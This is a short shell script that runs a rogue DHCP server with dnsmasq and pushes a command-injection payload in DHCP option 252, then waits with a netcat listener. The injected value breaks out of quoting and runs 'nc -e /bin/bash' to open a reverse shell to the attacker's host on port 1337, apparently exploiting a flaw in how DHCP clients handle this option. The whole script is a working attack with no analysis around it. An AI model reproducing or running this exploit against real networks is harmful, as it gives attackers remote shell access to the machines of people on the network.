#!/bin/sh

dnsmasq --user=root --interface=eth0 --bind-interfaces  --except-interface=lo --dhcp-range=10.10.0.10,10.10.0.20,1h --conf-file=/dev/null --dhcp-option=6,10.10.0.1 --dhcp-option=3,10.10.0.1 --dhcp-option="252,yarrak'&nc -e /bin/bash 10.10.0.3 1337 #" --log-queries --log-facility=/var/log/dnsmasq-server.log
nc -l -p 1337 -v
